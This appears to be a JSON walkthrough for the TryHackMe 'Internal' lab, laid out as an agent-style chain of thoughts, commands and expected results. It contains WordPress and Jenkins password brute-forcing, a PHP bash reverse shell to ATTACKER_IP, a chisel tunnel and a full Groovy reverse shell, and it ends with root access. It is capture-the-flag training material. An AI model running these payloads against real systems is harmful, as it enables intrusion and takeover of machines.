@@ -1,0 +1,131 @@
+{
+    "initial_prompt": "**Overall Task Goal:** Conduct a penetration test on the 'Internal' TryHackMe challenge. The objective is to gain initial access to the target machine `internal.thm`, pivot internally, and escalate privileges to retrieve two flags: `user.txt` and `root.txt`.\n**Attack Machine:** Kali Linux 2024. The attacker's IP address (referred to as `ATTACKER_IP`) is dynamic and should be confirmed (e.g., via `ip addr show tun0` or similar command).\n**Target Machine:** `internal.thm`. Its IP address (referred to as `TARGET_IP`) must be obtained (e.g., from TryHackMe) and added to the attacker's `/etc/hosts` file for name resolution.\n**Essential Information:** This exercise simulates a black-box penetration test, involving service discovery, web application exploitation (WordPress), internal pivoting (Jenkins), and privilege escalation through misconfigurations and credential discovery.",
+    "steps": [
+        {
+            "step_number": 1,
+            "thought": "Add the target machine's IP address and hostname to the `/etc/hosts` file on the attacker machine to allow hostname resolution for `internal.thm`. Replace `TARGET_IP` with the actual IP address of the target.",
+            "command": "echo \"TARGET_IP internal.thm\" | sudo tee -a /etc/hosts",
+            "result": "The entry 'TARGET_IP internal.thm' is appended to `/etc/hosts`. The hostname `internal.thm` will now resolve to `TARGET_IP`."
+        },
+        {
+            "step_number": 2,
+            "thought": "Perform a full port scan with service version detection, OS detection, and default script scanning on the target machine `internal.thm`.",
+            "command": "nmap -p- -A internal.thm",
+            "result": "Nmap scan initiated. Output will detail open ports, services, versions, and OS information. Key findings typically include Port 22 (SSH) and Port 80 (HTTP - Apache 2.4.29 on Ubuntu)."
+        },
+        {
+            "step_number": 3,
+            "thought": "Enumerate directories on the web server at `http://internal.thm` to find hidden paths or interesting files, focusing on common web extensions.",
+            "command": "dirsearch -u http://internal.thm -e php,txt,html",
+            "result": "Dirsearch scans the web server. Common discoveries include `/blog` (indicating a WordPress installation) and `/jenkins.txt`. The file `/jenkins.txt` might contain information like: 'Jenkins is running internally on 172.17.0.2:8080'."
+        },
+        {
+            "step_number": 4,
+            "thought": "Ensure the `rockyou.txt` wordlist is available for password cracking. If it's compressed (`.gz`), decompress it. This command checks for `rockyou.txt` and, if not found but `rockyou.txt.gz` exists, decompresses it.",
+            "command": "[ -f /usr/share/wordlists/rockyou.txt ] || (sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz && sudo chmod o+r /usr/share/wordlists/rockyou.txt)",
+            "result": "`rockyou.txt` is verified or made available at `/usr/share/wordlists/rockyou.txt`. If decompressed, the original `.gz` file is kept and read permissions are ensured."
+        },
+        {
+            "step_number": 5,
+            "thought": "Enumerate users on the WordPress site located at `http://internal.thm/blog` using `wpscan`.",
+            "command": "wpscan --url http://internal.thm/blog --enumerate u",
+            "result": "WPScan enumerates users. A common identified administrative user is `admin`."
+        },
+        {
+            "step_number": 6,
+            "thought": "Brute-force the password for the identified WordPress user 'admin' using `wpscan` and the `rockyou.txt` wordlist.",
+            "command": "wpscan --url http://internal.thm/blog --usernames admin -P /usr/share/wordlists/rockyou.txt",
+            "result": "WPScan attempts to brute-force the password. If successful, it will output the valid credentials, e.g., `admin:WORDPRESS_ADMIN_PASSWORD` (actual password will vary, e.g., 'password123')."
+        },
+        {
+            "step_number": 7,
+            "thought": "Prepare a PHP reverse shell payload locally on the attacker machine. This script will be manually uploaded/pasted into WordPress later. Replace `ATTACKER_IP` with your actual attacker IP and `6666` with your chosen listening port.",
+            "command": "echo '<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/6666 0>&1'\"); ?>' > /tmp/php_reverse_shell.php",
+            "result": "PHP reverse shell script saved to `/tmp/php_reverse_shell.php` on the attacker machine. The content of this file needs to be manually placed into a WordPress theme file (e.g., 404.php or another editable template) via the WordPress admin panel (Appearance > Theme Editor)."
+        },
+        {
+            "step_number": 8,
+            "thought": "Set up a Netcat listener on the attacker machine to receive the incoming reverse shell connection from the WordPress site on the specified port (e.g., 6666).",
+            "command": "nc -lvnp 6666",
+            "result": "Netcat listener started on port 6666. It is now waiting for a connection. After the PHP reverse shell is injected into WordPress and triggered (e.g., by visiting a URL that loads the modified template), a shell connection as the `www-data` user should be established."
+        },
+        {
+            "step_number": 9,
+            "thought": "Once the `www-data` shell is active, search for credentials or sensitive information. The walkthrough indicates a file at `/opt/wp-save.txt`.",
+            "command": "cat /opt/wp-save.txt",
+            "result": "The contents of `/opt/wp-save.txt` are displayed. This file typically contains credentials for another user, e.g., 'aubreanna:AUBREANNA_PASSWORD' (actual password will vary, e.g., 'password456')."
+        },
+        {
+            "step_number": 10,
+            "thought": "On the attacker machine, start a simple HTTP server in the directory containing the `chisel` binary to allow the target machine to download it. Ensure `chisel` is in the current directory or specify the path.",
+            "command": "python3 -m http.server 8000",
+            "result": "Python HTTP server started on port 8000, serving files from the current directory. `chisel` can now be downloaded by the target machine."
+        },
+        {
+            "step_number": 11,
+            "thought": "From the `www-data` shell on the target machine, download the `chisel` binary from the attacker's HTTP server to `/tmp` and make it executable. Replace `ATTACKER_IP` with your attacker IP.",
+            "command": "wget http://ATTACKER_IP:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel",
+            "result": "The `chisel` binary is downloaded to `/tmp/chisel` on the target machine and made executable. The attacker's HTTP server (from step 10) can now be stopped (Ctrl+C)."
+        },
+        {
+            "step_number": 12,
+            "thought": "Switch from the `www-data` user to `aubreanna` using the credentials found in `wp-save.txt`. You will be prompted for `AUBREANNA_PASSWORD`.",
+            "command": "su aubreanna",
+            "result": "Successfully switched to user `aubreanna` after providing her password. The shell prompt will change, indicating the new user context."
+        },
+        {
+            "step_number": 13,
+            "thought": "As user `aubreanna`, navigate to her home directory and read the `user.txt` flag.",
+            "command": "cat /home/aubreanna/user.txt",
+            "result": "The content of `user.txt` is displayed, revealing the user flag (e.g., `THM{USER_FLAG_CONTENT}`)."
+        },
+        {
+            "step_number": 14,
+            "thought": "On the attacker machine, start a `chisel` server in reverse mode, listening on a specific port (e.g., 9001), to accept connections from the `chisel` client on the target.",
+            "command": "./chisel server -p 9001 --reverse",
+            "result": "`chisel` server started on the attacker machine, listening on port 9001 for reverse connections."
+        },
+        {
+            "step_number": 15,
+            "thought": "As `aubreanna` on the target machine, run the `chisel` client to connect to the attacker's `chisel` server. This will forward a local port on the attacker machine (e.g., 8080) to the internal Jenkins service (172.17.0.2:8080). Replace `ATTACKER_IP`.",
+            "command": "/tmp/chisel client ATTACKER_IP:9001 R:localhost:8080:172.17.0.2:8080",
+            "result": "Port forwarding established via `chisel`. The internal Jenkins service at `172.17.0.2:8080` on the target network is now accessible on the attacker machine via `http://localhost:8080`."
+        },
+        {
+            "step_number": 16,
+            "thought": "Brute-force the Jenkins login page (now accessible at `http://localhost:8080` on the attacker machine) for the 'admin' user, using `rockyou.txt`. The exact `hydra` command might need adjustment based on Jenkins login form specifics.",
+            "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost:8080 http-post-form \"/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password\"",
+            "result": "Hydra attempts to brute-force the Jenkins login. If successful, it will identify the correct password for 'admin' (e.g., `admin:JENKINS_ADMIN_PASSWORD`, actual password 'jenkins789' or similar)."
+        },
+        {
+            "step_number": 17,
+            "thought": "Set up a new Netcat listener on the attacker machine (e.g., on port 7777) to receive the reverse shell from Jenkins.",
+            "command": "nc -lvnp 7777",
+            "result": "Netcat listener started on port 7777, waiting for the reverse shell connection from Jenkins."
+        },
+        {
+            "step_number": 18,
+            "thought": "Prepare the Groovy script for the Jenkins Script Console. This script will establish a reverse shell to the attacker. Replace `ATTACKER_IP` with your IP and `7777` with the listener port.",
+            "command": "echo 'String host=\"ATTACKER_IP\"; int port=7777; String cmd=\"/bin/bash\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();' > /tmp/jenkins_rev_shell.groovy",
+            "result": "Groovy reverse shell script saved to `/tmp/jenkins_rev_shell.groovy` on the attacker machine. The content of this file must be copied and pasted into the Jenkins Script Console (usually at `http://localhost:8080/script`) and executed."
+        },
+        {
+            "step_number": 19,
+            "thought": "After executing the Groovy script in Jenkins, a shell as the `jenkins` user is obtained on the listener from step 17. Enumerate files in `/opt` for further credentials, as suggested by the HackingArticles walkthrough.",
+            "command": "cat /opt/note.txt",
+            "result": "The contents of `/opt/note.txt` are displayed from the `jenkins` shell. This file typically contains root credentials, e.g., 'root:ROOT_PASSWORD' (actual password will vary)."
+        },
+        {
+            "step_number": 20,
+            "thought": "Switch to the `root` user from the `jenkins` shell using the credentials found in `/opt/note.txt`. You will be prompted for `ROOT_PASSWORD`.",
+            "command": "su root",
+            "result": "Successfully switched to user `root` after providing the password. The shell prompt changes to a root prompt (e.g., `root@internal#`)."
+        },
+        {
+            "step_number": 21,
+            "thought": "As `root`, navigate to the `/root` directory and read the `root.txt` flag to complete the challenge.",
+            "command": "cat /root/root.txt",
+            "result": "The content of `root.txt` is displayed, revealing the root flag (e.g., `THM{ROOT_FLAG_CONTENT}`). Challenge completed."
+        }
+    ]
+}
